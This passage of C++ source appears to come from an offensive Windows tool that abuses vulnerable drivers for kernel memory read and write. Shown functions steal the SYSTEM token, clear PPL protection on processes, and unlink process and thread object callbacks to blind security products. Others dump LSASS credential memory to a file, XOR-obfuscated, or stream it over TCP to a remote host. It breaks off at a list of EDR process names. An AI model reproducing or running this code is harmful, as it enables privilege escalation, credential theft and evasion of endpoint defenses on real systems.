        for (QWORD pa = start; pa < end; pa += 0x1000) {
            if (!RwDrv_IsSafeAddr(pa)) continue;
            QWORD e0 = 0;
            if (!RwDrv_PhysRead(pa, &e0, 8)) continue;
            if (!(e0 & 1) || (e0 & 0x80)) continue;
            QWORD pa0 = e0 & ~0xFFFULL;
            if (pa0 == 0 || pa0 >= RAM_LIMIT) continue;
            for (int i = 1; i < 512; i++) {
                QWORD entry = 0;
                if (!RwDrv_PhysRead(pa + (QWORD)i * 8, &entry, 8)) break;
                if ((entry & 1) && (entry & ~0xFFFULL) == pa)
                    return pa;
            }
        }
        return 0;
    };
    QWORD cr3 = scan_range(0x400000, 0x4000000ULL);
    if (!cr3) cr3 = scan_range(0x4000000ULL, 0x10000000ULL);
    return cr3;
}

static QWORD RwDrv_Va2Pa(QWORD va) {
    if (!g_rwDrvCr3) return 0;
    QWORD pml4_idx = (va >> 39) & 0x1FF;
    QWORD pdpt_idx = (va >> 30) & 0x1FF;
    QWORD pd_idx   = (va >> 21) & 0x1FF;
    QWORD pt_idx   = (va >> 12) & 0x1FF;
    QWORD offset   = va & 0xFFF;

    QWORD pml4e = 0; RwDrv_PhysRead((g_rwDrvCr3 & ~0xFFFULL) + pml4_idx * 8, &pml4e, 8);
    if (!(pml4e & 1)) return 0;
    QWORD pdpte = 0; RwDrv_PhysRead((pml4e & ~0xFFFULL) + pdpt_idx * 8, &pdpte, 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & 0x80) return (pdpte & 0xFFFFFC0000000ULL) + (va & 0x3FFFFFFF);
    QWORD pde = 0; RwDrv_PhysRead((pdpte & ~0xFFFULL) + pd_idx * 8, &pde, 8);
    if (!(pde & 1)) return 0;
    if (pde & 0x80) return (pde & 0xFFFFFFE00000ULL) + (va & 0x1FFFFF);
    QWORD pte = 0; RwDrv_PhysRead((pde & ~0xFFFULL) + pt_idx * 8, &pte, 8);
    if (!(pte & 1)) return 0;
    return (pte & ~0xFFFULL) + offset;
}

static bool RwDrv_KRead(QWORD addr, PVOID buf, SIZE_T size) {
    PBYTE pCurBuf = (PBYTE)buf;
    QWORD pCurVA  = addr;
    while (size > 0) {
        DWORD chunk = (DWORD)std::min<SIZE_T>(size, 0x1000 - (pCurVA & 0xFFF));
        QWORD pa = RwDrv_Va2Pa(pCurVA);
        if (!pa || !RwDrv_PhysRead(pa, pCurBuf, chunk)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool RwDrv_KWrite(QWORD addr, PVOID buf, SIZE_T size) {
    PBYTE pCurBuf = (PBYTE)buf;
    QWORD pCurVA  = addr;
    while (size > 0) {
        DWORD chunk = (DWORD)std::min<SIZE_T>(size, 0x1000 - (pCurVA & 0xFFF));
        QWORD pa = RwDrv_Va2Pa(pCurVA);
        if (!pa || !RwDrv_PhysWrite(pa, pCurBuf, chunk)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static ProviderType g_activeProvider;

static bool KRead(QWORD addr, PVOID buf, SIZE_T size) {
    switch (g_activeProvider) {
    case ProviderType::BiosTool: return BiosTool_KRead(addr, buf, size);
    case ProviderType::Ktapi:    return Ktapi_KRead(addr, buf, size);
    case ProviderType::PdfwKrnl: return PdfwKrnl_KRead(addr, buf, (DWORD)size);
    case ProviderType::IocDrv:   return IocDrv_KRead(addr, buf, size);
    case ProviderType::AsIO3:    return Asio3_KRead(addr, buf, size);
    case ProviderType::NTIOLib:  return NTIOLib_KRead(addr, buf, size);
    case ProviderType::RtsPpx:   return RtsPpx_KRead(addr, buf, size);
    case ProviderType::RwDrv:    return RwDrv_KRead(addr, buf, size);
    default: return false;
    }
}

static bool KWrite(QWORD addr, PVOID buf, SIZE_T size) {
    switch (g_activeProvider) {
    case ProviderType::BiosTool: return BiosTool_KWrite(addr, buf, size);
    case ProviderType::Ktapi:    return Ktapi_KWrite(addr, buf, size);
    case ProviderType::PdfwKrnl: return PdfwKrnl_KWrite(addr, buf, (DWORD)size);
    case ProviderType::IocDrv:   return IocDrv_KWrite(addr, buf, size);
    case ProviderType::AsIO3:    return Asio3_KWrite(addr, buf, size);
    case ProviderType::NTIOLib:  return NTIOLib_KWrite(addr, buf, size);
    case ProviderType::RtsPpx:   return RtsPpx_KWrite(addr, buf, size);
    case ProviderType::RwDrv:    return RwDrv_KWrite(addr, buf, size);
    default: return false;
    }
}

static QWORD KReadQword(QWORD addr) {
    QWORD v = 0;
    KRead(addr, &v, 8);
    return v;
}

static bool LooksLikeName(QWORD eproc, QWORD off) {
    BYTE b[16]{};
    if (!KRead(eproc + off, b, 16)) return false;
    int ok = 0;
    for (int i = 0; i < 15; i++) {
        if (!b[i]) break;
        if (b[i] >= 0x20 && b[i] < 0x7f) ok++;
    }
    return ok >= 3;
}

static bool LooksLikeProtection(QWORD eproc, QWORD off) {
    BYTE b = 0xFF;
    if (!KRead(eproc + off, &b, 1)) return false;
    return b <= 0x72 && (b & 0x0C) == 0 && (b & 0x03) <= 2;
}

static void ScanAndFixOffsets(QWORD eproc, DWORD pid) {
    (void)pid;
    if (!LooksLikeName(eproc, g_off.ImageFileName)) {
        for (QWORD s = 0x300; s <= 0x700; s += 8) {
            if (LooksLikeName(eproc, s)) {
                printf("[*] ImageFileName scanned to 0x%llX (was 0x%llX)\n", s, g_off.ImageFileName);
                g_off.ImageFileName = s;
                break;
            }
        }
    }
    if (!LooksLikeProtection(eproc, g_off.Protection)) {
        for (QWORD s = 0x500; s <= 0xA00; s += 8) {
            if (LooksLikeProtection(eproc, s)) {
                printf("[*] Protection scanned to 0x%llX (was 0x%llX)\n", s, g_off.Protection);
                g_off.Protection = s;
                break;
            }
        }
    }
}

static QWORD PsISPOffset() {
    HMODULE ntos = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!ntos) return 0;
    FARPROC p = GetProcAddress(ntos, "PsInitialSystemProcess");
    QWORD off = p ? ((QWORD)p - (QWORD)ntos) : 0;
    FreeLibrary(ntos);
    return off;
}

struct KernelBase { QWORD ntosBase; QWORD systemEproc; };

static KernelBase GetKernelBase() {
    KernelBase r{};
    LPVOID drvs[1024];
    DWORD cb;
    if (EnumDeviceDrivers(drvs, sizeof(drvs), &cb))
        r.ntosBase = (QWORD)drvs[0];
    if (!r.ntosBase) return r;
    QWORD sysOff = PsISPOffset();
    if (!sysOff) return r;
    r.systemEproc = KReadQword(r.ntosBase + sysOff);
    return r;
}

static QWORD FindEprocessByPid(QWORD sysEproc, DWORD pid, char name[16]) {
    QWORD head  = sysEproc + g_off.ActiveProcessLinks;
    QWORD flink = KReadQword(head);
    int guard = 0;
    while (flink && flink != head && guard++ < 10000) {
        QWORD ep  = flink - g_off.ActiveProcessLinks;
        QWORD cur = KReadQword(ep + g_off.UniqueProcessId);
        if ((DWORD)cur == pid) {
            if (name) { KRead(ep + g_off.ImageFileName, name, 15); name[15] = 0; }
            return ep;
        }
        flink = KReadQword(ep + g_off.ActiveProcessLinks);
    }
    return 0;
}

static QWORD FindEprocessByName(QWORD sysEproc, const char* target) {
    QWORD head  = sysEproc + g_off.ActiveProcessLinks;
    QWORD flink = KReadQword(head);
    int guard = 0;
    while (flink && flink != head && guard++ < 10000) {
        QWORD ep = flink - g_off.ActiveProcessLinks;
        char nm[16]{};
        KRead(ep + g_off.ImageFileName, nm, 15);
        if (_stricmp(nm, target) == 0) return ep;
        flink = KReadQword(ep + g_off.ActiveProcessLinks);
    }
    return 0;
}

static bool TokenSteal(QWORD sysEproc, DWORD targetPid) {
    QWORD sysToken = KReadQword(sysEproc + g_off.Token) & ~0xFULL;
    if (!sysToken) { printf("[-] Failed to read SYSTEM token\n"); return false; }
    printf("[+] SYSTEM token: 0x%llX\n", sysToken);

    char nm[16]{};
    QWORD targetEp = FindEprocessByPid(sysEproc, targetPid, nm);
    if (!targetEp) { printf("[-] Target PID %lu not found\n", targetPid); return false; }
    printf("[+] Target EPROCESS 0x%llX (%s)\n", targetEp, nm);

    QWORD curToken = KReadQword(targetEp + g_off.Token);
    printf("[*] Current token: 0x%llX -> stealing SYSTEM token\n", curToken);

    QWORD newToken = sysToken | (curToken & 0xF);
    if (!KWrite(targetEp + g_off.Token, &newToken, 8)) {
        printf("[-] KWrite token failed\n"); return false;
    }
    QWORD check = KReadQword(targetEp + g_off.Token);
    printf("[!!!] Token written: 0x%llX (verify: 0x%llX)\n", newToken, check);
    return true;
}

static QWORD FindNtosExport(QWORD ntosBase, const char* symName) {
    DWORD peOff = 0;
    KRead(ntosBase + 0x3C, &peOff, 4);
    if (!peOff || peOff > 0x1000) return 0;

    DWORD eDirRva = 0, numNames = 0, numFuncs = 0;
    DWORD namesRVA = 0, funcsRVA = 0, ordsRVA = 0;
    KRead(ntosBase + peOff + 0x88, &eDirRva, 4);
    if (!eDirRva) return 0;
    QWORD eDir = ntosBase + eDirRva;
    KRead(eDir + 0x14, &numFuncs,  4);
    KRead(eDir + 0x18, &numNames,  4);
    KRead(eDir + 0x1C, &funcsRVA,  4);
    KRead(eDir + 0x20, &namesRVA,  4);
    KRead(eDir + 0x24, &ordsRVA,   4);

    size_t targLen = strlen(symName);
    for (DWORD i = 0; i < numNames && i < 100000; i++) {
        DWORD nameRVA = 0;
        KRead(ntosBase + namesRVA + (QWORD)i * 4, &nameRVA, 4);
        if (!nameRVA) continue;
        char buf[256]{};
        KRead(ntosBase + nameRVA, buf, (DWORD)std::min(targLen + 2, (size_t)255));
        if (memcmp(buf, symName, targLen) == 0 && buf[targLen] == 0) {
            WORD ord = 0;
            KRead(ntosBase + ordsRVA + (QWORD)i * 2, &ord, 2);
            DWORD funcRVA = 0;
            KRead(ntosBase + funcsRVA + (QWORD)ord * 4, &funcRVA, 4);
            return ntosBase + funcRVA;
        }
    }
    return 0;
}

static void UnlinkCallbackList(const char* typeName, QWORD listHead) {
    QWORD flink = KReadQword(listHead);
    if (flink == listHead || !flink) {
        printf("[+] %s CallbackList already empty\n", typeName);
        return;
    }
    QWORD entry = flink;
    int seen = 0;
    while (entry && entry != listHead && seen < 64) {
        QWORD pre  = KReadQword(entry + 0x28);
        QWORD post = KReadQword(entry + 0x30);
        printf("[*]   %s entry[%d] 0x%llX: pre=0x%llX post=0x%llX\n",
               typeName, seen, entry, pre, post);
        entry = KReadQword(entry);
        seen++;
    }
    printf("[*] Unlinking %d %s callback(s)...\n", seen, typeName);
    if (!KWrite(listHead,     &listHead, 8) ||
        !KWrite(listHead + 8, &listHead, 8)) {
        printf("[-] KWrite %s CallbackList unlink failed\n", typeName);
        return;
    }
    printf("[+] %s ObCallback list unlinked (%d entries)\n", typeName, seen);
}

static void ListCallbackList(const char* typeName, QWORD listHead) {
    QWORD flink = KReadQword(listHead);
    if (flink == listHead || !flink) {
        printf("[*] %s CallbackList: empty\n", typeName);
        return;
    }
    QWORD entry = flink;
    int seen = 0;
    while (entry && entry != listHead && seen < 64) {
        QWORD pre  = KReadQword(entry + 0x28);
        QWORD post = KReadQword(entry + 0x30);
        printf("[*]   %s entry[%d] 0x%llX: pre=0x%llX post=0x%llX\n",
               typeName, seen, entry, pre, post);
        entry = KReadQword(entry);
        seen++;
    }
    printf("[*] %s CallbackList: %d registration(s) found\n", typeName, seen);
}

static bool PatchObCallbacks(QWORD ntosBase) {
    QWORD psProcTypeAddr = FindNtosExport(ntosBase, "PsProcessType");
    if (!psProcTypeAddr) { printf("[-] PsProcessType export not found\n"); return false; }
    QWORD procObjType = KReadQword(psProcTypeAddr);
    if (!procObjType) { printf("[-] *PsProcessType is NULL\n"); return false; }
    printf("[*] OBJECT_TYPE (Process): 0x%llX\n", procObjType);
    UnlinkCallbackList("Process", procObjType + 0xC8);

    QWORD psThreadTypeAddr = FindNtosExport(ntosBase, "PsThreadType");
    if (psThreadTypeAddr) {
        QWORD threadObjType = KReadQword(psThreadTypeAddr);
        if (threadObjType) {
            printf("[*] OBJECT_TYPE (Thread): 0x%llX\n", threadObjType);
            UnlinkCallbackList("Thread", threadObjType + 0xC8);
        }
    }
    return true;
}

static bool ListCallbacks(QWORD ntosBase) {
    QWORD psProcTypeAddr = FindNtosExport(ntosBase, "PsProcessType");
    if (!psProcTypeAddr) { printf("[-] PsProcessType export not found\n"); return false; }
    QWORD procObjType = KReadQword(psProcTypeAddr);
    if (!procObjType) { printf("[-] *PsProcessType is NULL\n"); return false; }
    printf("[*] OBJECT_TYPE (Process): 0x%llX\n", procObjType);
    ListCallbackList("Process", procObjType + 0xC8);

    QWORD psThreadTypeAddr = FindNtosExport(ntosBase, "PsThreadType");
    if (psThreadTypeAddr) {
        QWORD threadObjType = KReadQword(psThreadTypeAddr);
        if (threadObjType) {
            printf("[*] OBJECT_TYPE (Thread): 0x%llX\n", threadObjType);
            ListCallbackList("Thread", threadObjType + 0xC8);
        }
    }
    return true;
}

static QWORD Cr3VaToPa(QWORD cr3, QWORD va) {
    QWORD pml4_idx = (va >> 39) & 0x1FF;
    QWORD pdpt_idx = (va >> 30) & 0x1FF;
    QWORD pd_idx   = (va >> 21) & 0x1FF;
    QWORD pt_idx   = (va >> 12) & 0x1FF;
    QWORD offset   = va & 0xFFF;

    QWORD pml4e = 0; BiosTool_ReadPhys((PVOID)((cr3 & ~0xFFFULL) + pml4_idx * 8), 8, &pml4e);
    if (!(pml4e & 1)) return 0;
    QWORD pdpte = 0; BiosTool_ReadPhys((PVOID)((pml4e & ~0xFFFULL) + pdpt_idx * 8), 8, &pdpte);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFFULL);
    QWORD pde = 0; BiosTool_ReadPhys((PVOID)((pdpte & ~0xFFFULL) + pd_idx * 8), 8, &pde);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL);
    QWORD pte = 0; BiosTool_ReadPhys((PVOID)((pde & ~0xFFFULL) + pt_idx * 8), 8, &pte);
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | offset;
}

static bool PhysReadProcessMemory(QWORD cr3, QWORD va, PVOID buf, SIZE_T size) {
    auto pOut = (PUCHAR)buf;
    while (size > 0) {
        QWORD pageOff = va & 0xFFF;
        QWORD chunk   = std::min(size, (SIZE_T)(0x1000 - pageOff));
        QWORD pa = Cr3VaToPa(cr3, va);
        if (!pa) {
            memset(pOut, 0, chunk);
        } else {
            if (!BiosTool_ReadPhys((PVOID)pa, chunk, pOut)) return false;
        }
        va   += chunk;
        pOut += chunk;
        size -= chunk;
    }
    return true;
}

struct PplResult { bool ok; QWORD eproc; BYTE before; char name[16]; };

static PplResult StripPpl(QWORD sysEproc, DWORD pid, bool dryRun, bool clearSigLevel = false) {
    PplResult r{};
    r.eproc = FindEprocessByPid(sysEproc, pid, r.name);
    if (!r.eproc) { printf("[-] PID %lu not found\n", pid); return r; }
    printf("[+] Target EPROCESS: 0x%llX (%s)\n", r.eproc, r.name);

    ScanAndFixOffsets(r.eproc, pid);

    BYTE sigLevel = 0, secSigLevel = 0;
    KRead(r.eproc + g_off.Protection - 2, &sigLevel,    1);
    KRead(r.eproc + g_off.Protection - 1, &secSigLevel, 1);
    KRead(r.eproc + g_off.Protection,     &r.before,    1);
    printf("[*] SignatureLevel=0x%02X  SectionSignatureLevel=0x%02X  Protection=0x%02X\n",
           sigLevel, secSigLevel, r.before);

    if (dryRun) { printf("[dry-run] Skipping write\n"); r.ok = true; return r; }
    if (r.before == 0 && !clearSigLevel) { printf("[!] Protection already 0x00\n"); r.ok = true; return r; }

    if (clearSigLevel) {
        BYTE zero = 0;
        KWrite(r.eproc + g_off.Protection - 2, &zero, 1);
        KWrite(r.eproc + g_off.Protection - 1, &zero, 1);
    }

    BYTE zero = 0;
    if (!KWrite(r.eproc + g_off.Protection, &zero, 1)) {
        printf("[-] KWrite Protection failed (%lu)\n", GetLastError()); return r;
    }
    BYTE after = 0xFF;
    KRead(r.eproc + g_off.Protection, &after, 1);
    if (after != 0) { printf("[-] Write issued but Protection=0x%02X\n", after); return r; }
    printf("[!!!] Protection byte cleared (0x%02X -> 0x00)\n", r.before);
    r.ok = true;
    return r;
}

static void RestorePpl(QWORD eproc, BYTE protection, BYTE sigLevel, BYTE secSigLevel) {
    KWrite(eproc + g_off.Protection - 2, &sigLevel,    1);
    KWrite(eproc + g_off.Protection - 1, &secSigLevel, 1);
    KWrite(eproc + g_off.Protection,     &protection,  1);
    BYTE check = 0;
    KRead(eproc + g_off.Protection, &check, 1);
    printf("[*] Protection restored: 0x%02X (verify: 0x%02X)\n", protection, check);
}

static bool PplAdd(QWORD sysEproc, DWORD pid) {
    char nm[16]{};
    QWORD ep = FindEprocessByPid(sysEproc, pid, nm);
    if (!ep) { printf("[-] PID %lu not found\n", pid); return false; }
    printf("[+] Target EPROCESS: 0x%llX (%s)\n", ep, nm);

    BYTE cur = 0; KRead(ep + g_off.Protection, &cur, 1);
    printf("[*] Current Protection: 0x%02X\n", cur);

    BYTE ppl = 0x62;
    if (!KWrite(ep + g_off.Protection, &ppl, 1)) {
        printf("[-] KWrite Protection failed\n"); return false;
    }
    BYTE check = 0; KRead(ep + g_off.Protection, &check, 1);
    printf("[+] Protection set to 0x%02X (verify: 0x%02X) - PsProtectedTypeProtected/WinSystem\n", ppl, check);
    return (check == ppl);
}

static DWORD FindPidByName(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) do {
        char nm[MAX_PATH]{};
        WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, nm, sizeof(nm), nullptr, nullptr);
        if (_stricmp(nm, name) == 0) { pid = pe.th32ProcessID; break; }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return pid;
}

static bool DumpLsass(DWORD pid, const char* outPath, bool noXor, BYTE xorKey = 0x55) {
    EnablePrivilege("SeDebugPrivilege");

    typedef NTSTATUS(WINAPI* NtSP_t)(HANDLE);
    auto NtSP = (NtSP_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSuspendProcess");
    auto NtRP = (NtSP_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtResumeProcess");

    HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hTarget) { printf("[-] OpenProcess %lu failed (%lu)\n", pid, GetLastError()); return false; }

    if (NtSP) { NTSTATUS st = NtSP(hTarget); printf("[*] NtSuspendProcess: 0x%lX\n", (ULONG)st); }

    HANDLE hOut = CreateFileA(outPath, GENERIC_WRITE, FILE_SHARE_READ, nullptr,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hOut == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile %s failed (%lu)\n", outPath, GetLastError());
        if (NtRP) NtRP(hTarget);
        CloseHandle(hTarget);
        return false;
    }

    MINIDUMP_TYPE dumpType = (MINIDUMP_TYPE)(
        MiniDumpWithFullMemory | MiniDumpWithHandleData |
        MiniDumpWithUnloadedModules | MiniDumpWithFullMemoryInfo |
        MiniDumpWithThreadInfo | MiniDumpWithTokenInformation);

    printf("[*] MiniDumpWriteDump PID=%lu...\n", pid);
    BOOL ok = MiniDumpWriteDump(hTarget, pid, hOut, dumpType, nullptr, nullptr, nullptr);
    DWORD err = GetLastError();

    FlushFileBuffers(hOut);
    CloseHandle(hOut);
    if (NtRP) NtRP(hTarget);
    CloseHandle(hTarget);

    if (!ok) { printf("[-] MiniDumpWriteDump failed, GLE=%lu\n", err); return false; }

    LARGE_INTEGER sz{};
    HANDLE hCheck = CreateFileA(outPath, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                                nullptr, OPEN_EXISTING, 0, nullptr);
    if (hCheck != INVALID_HANDLE_VALUE) { GetFileSizeEx(hCheck, &sz); CloseHandle(hCheck); }
    printf("[!!!] Dump written to %s (%lld bytes)\n", outPath, sz.QuadPart);

    if (!noXor && sz.QuadPart > 0) {
        HANDLE hXor = CreateFileA(outPath, GENERIC_READ|GENERIC_WRITE, 0,
                                  nullptr, OPEN_EXISTING, 0, nullptr);
        if (hXor != INVALID_HANDLE_VALUE) {
            const DWORD CHUNK = 1024*1024;
            std::vector<BYTE> xbuf(CHUNK);
            DWORD got = 0;
            LARGE_INTEGER pos{};
            SetFilePointerEx(hXor, pos, nullptr, FILE_BEGIN);
            while (ReadFile(hXor, xbuf.data(), CHUNK, &got, nullptr) && got > 0) {
                for (DWORD i = 0; i < got; i++) xbuf[i] ^= xorKey;
                LARGE_INTEGER back{}; back.QuadPart = -(LONGLONG)got;
                SetFilePointerEx(hXor, back, nullptr, FILE_CURRENT);
                DWORD w = 0; WriteFile(hXor, xbuf.data(), got, &w, nullptr);
            }
            CloseHandle(hXor);
            printf("[*] Output XOR'd with 0x%02X\n", xorKey);
        }
    }

    return sz.QuadPart > 0;
}

static bool DumpRpm(DWORD pid, const char* outPath) {
    EnablePrivilege("SeDebugPrivilege");
    HANDLE hTarget = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hTarget) { printf("[-] OpenProcess PROCESS_VM_READ failed (%lu)\n", GetLastError()); return false; }

    FILE* fOut = fopen(outPath, "wb");
    if (!fOut) { printf("[-] fopen %s failed\n", outPath); CloseHandle(hTarget); return false; }

    MEMORY_BASIC_INFORMATION mbi{};
    BYTE* addr = nullptr;
    SIZE_T totalBytes = 0, regions = 0;
    printf("[*] DumpRpm: scanning LSASS virtual memory...\n");
    while (VirtualQueryEx(hTarget, addr, &mbi, sizeof(mbi))) {
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & PAGE_GUARD) == 0 &&
            (mbi.Protect & PAGE_NOACCESS) == 0) {
            std::vector<BYTE> buf(mbi.RegionSize);
            SIZE_T bytesRead = 0;
            if (ReadProcessMemory(hTarget, mbi.BaseAddress, buf.data(), mbi.RegionSize, &bytesRead) && bytesRead > 0) {
                QWORD base = (QWORD)mbi.BaseAddress;
                QWORD sz   = bytesRead;
                fwrite(&base, 8, 1, fOut);
                fwrite(&sz,   8, 1, fOut);
                fwrite(buf.data(), 1, bytesRead, fOut);
                totalBytes += bytesRead;
                regions++;
            }
        }
        addr = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
        if ((QWORD)addr < (QWORD)mbi.BaseAddress) break;
    }
    fflush(fOut);
    fclose(fOut);
    CloseHandle(hTarget);
    printf("[*] DumpRpm: %zu regions, %zu bytes -> %s\n", regions, totalBytes, outPath);
    return totalBytes > 0;
}

static bool DumpRpmTcp(DWORD pid, const char* recvIp, int recvPort) {
    EnablePrivilege("SeDebugPrivilege");
    HANDLE hTarget = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hTarget) { printf("[-] OpenProcess PROCESS_VM_READ failed (%lu)\n", GetLastError()); return false; }

    WSADATA wsa{};
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[-] WSAStartup failed\n"); CloseHandle(hTarget); return false;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        printf("[-] socket() failed\n"); WSACleanup(); CloseHandle(hTarget); return false;
    }
    DWORD tv = 30000;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));

    struct sockaddr_in sa{};
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((u_short)recvPort);
    inet_pton(AF_INET, recvIp, &sa.sin_addr);

    printf("[*] Connecting to %s:%d...\n", recvIp, recvPort);
    if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
        printf("[-] connect() failed (%d)\n", WSAGetLastError());
        closesocket(sock); WSACleanup(); CloseHandle(hTarget); return false;
    }
    printf("[+] Connected. Streaming LSASS memory...\n");

    MEMORY_BASIC_INFORMATION mbi{};
    BYTE* addr = nullptr;
    SIZE_T totalBytes = 0, regions = 0;

    auto sendAll = [&](const void* data, int len) -> bool {
        const char* p = (const char*)data;
        while (len > 0) {
            int sent = send(sock, p, len, 0);
            if (sent <= 0) return false;
            p += sent; len -= sent;
        }
        return true;
    };

    while (VirtualQueryEx(hTarget, addr, &mbi, sizeof(mbi))) {
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & PAGE_GUARD) == 0 &&
            (mbi.Protect & PAGE_NOACCESS) == 0) {
            std::vector<BYTE> buf(mbi.RegionSize);
            SIZE_T bytesRead = 0;
            if (ReadProcessMemory(hTarget, mbi.BaseAddress, buf.data(), mbi.RegionSize, &bytesRead) && bytesRead > 0) {
                QWORD base = (QWORD)mbi.BaseAddress;
                QWORD sz   = bytesRead;
                if (!sendAll(&base, 8) || !sendAll(&sz, 8) || !sendAll(buf.data(), (int)bytesRead)) {
                    printf("[-] send() failed at region 0x%llX\n", base);
                    break;
                }
                totalBytes += bytesRead;
                regions++;
            }
        }
        addr = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
        if ((QWORD)addr < (QWORD)mbi.BaseAddress) break;
    }

    closesocket(sock);
    WSACleanup();
    CloseHandle(hTarget);
    printf("[+] DumpRpmTcp: %zu regions, %zu bytes sent to %s:%d\n", regions, totalBytes, recvIp, recvPort);
    return totalBytes > 0;
}

static bool DumpKernel(QWORD sysEproc, DWORD pid, const char* outPath) {
    char nm[16]{};
    QWORD lsassEp = FindEprocessByPid(sysEproc, pid, nm);
    if (!lsassEp) { printf("[-] LSASS EPROCESS not found\n"); return false; }

    QWORD cr3 = KReadQword(lsassEp + 0x28);
    printf("[*] LSASS EPROCESS: 0x%llX  CR3: 0x%llX\n", lsassEp, cr3);
    if (!cr3) { printf("[-] CR3 read returned 0\n"); return false; }

    static const DWORD ucrOffsets[] = { 0x388, 0x280, 0x3B8, 0x028 };
    QWORD useCr3 = cr3;
    for (DWORD off : ucrOffsets) {
        QWORD cand = KReadQword(lsassEp + off);
        if (!cand || cand == cr3) continue;
        QWORD candBase = cand & ~0xFFFULL;
        QWORD pml4_0 = 0;
        if (BiosTool_ReadPhys((PVOID)candBase, 8, &pml4_0) && (pml4_0 & 1)) {
            printf("[*] UserDirectoryTableBase @ 0x%lX = 0x%llX\n", off, cand);
            useCr3 = cand;
            break;
        }
    }
    if (useCr3 == cr3)
        printf("[!] Using kernel CR3 - user-mode pages may not all translate\n");

    typedef NTSTATUS(NTAPI* NtQVM_t)(HANDLE, PVOID, ULONG, PVOID, SIZE_T, PSIZE_T);
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto NtQVM = (NtQVM_t)GetProcAddress(ntdll, "NtQueryVirtualMemory");
    if (!NtQVM) { printf("[-] NtQueryVirtualMemory not found\n"); return false; }

    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION,
                               FALSE, pid);
    if (!hProc) {
        hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    }
    if (!hProc) { printf("[-] Cannot open LSASS for query (%lu)\n", GetLastError()); return false; }

    HANDLE hOut = CreateFileA(outPath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
                              FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hOut == INVALID_HANDLE_VALUE) { CloseHandle(hProc); return false; }

    struct { char magic[8]; QWORD va; QWORD size; } regionHdr;
    memcpy(regionHdr.magic, "CASCRAW\0", 8);

    QWORD addr = 0x10000;
    MEMORY_BASIC_INFORMATION mbi{};
    SIZE_T retLen = 0;
    int regions = 0, hits = 0;
    const BYTE needle[] = { 'N',0,'T',0,'L',0,'M',0 };

    bool earlyStop = false;
    while (!earlyStop && addr < 0x7FFFFFFFFFFF00ULL) {
        NTSTATUS st = NtQVM(hProc, (PVOID)addr, 0, &mbi, sizeof(mbi), &retLen);
        if (!NT_SUCCESS(st)) break;
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READ |
                            PAGE_EXECUTE_READWRITE | PAGE_READONLY)) &&
            !(mbi.Protect & PAGE_NOACCESS) && !(mbi.Protect & PAGE_GUARD)) {
            SIZE_T rsz = mbi.RegionSize;
            if (rsz > 16ULL * 1024 * 1024) rsz = 16ULL * 1024 * 1024;
            std::vector<BYTE> rbuf(rsz, 0);
            if (PhysReadProcessMemory(useCr3, (QWORD)mbi.BaseAddress, rbuf.data(), rsz)) {
                regionHdr.va   = (QWORD)mbi.BaseAddress;
                regionHdr.size = rsz;
                DWORD w = 0;
                WriteFile(hOut, &regionHdr, sizeof(regionHdr), &w, nullptr);
                WriteFile(hOut, rbuf.data(), (DWORD)rsz, &w, nullptr);
                regions++;
                for (SIZE_T i = 0; i + sizeof(needle) < rsz && !earlyStop; i++) {
                    if (memcmp(&rbuf[i], needle, sizeof(needle)) == 0) {
                        hits++;
                        printf("[+] NTLM marker at LSASS VA 0x%llX\n",
                               (QWORD)mbi.BaseAddress + i);
                        if (hits > 64) earlyStop = true;
                    }
                }
            }
        }
        addr = (QWORD)mbi.BaseAddress + mbi.RegionSize;
    }
    CloseHandle(hProc);
    CloseHandle(hOut);
    printf("[+] Kernel-direct dump: %d regions, %d NTLM markers -> %s\n",
           regions, hits, outPath);
    return regions > 0;
}

static const char* kEdrProcs[] = {
    "acronis_agent.exe","BackupAndRecoveryAgent.exe","managementagenthost.exe","mms.exe",
    "alienvault-agent.exe","osqueryd.exe",
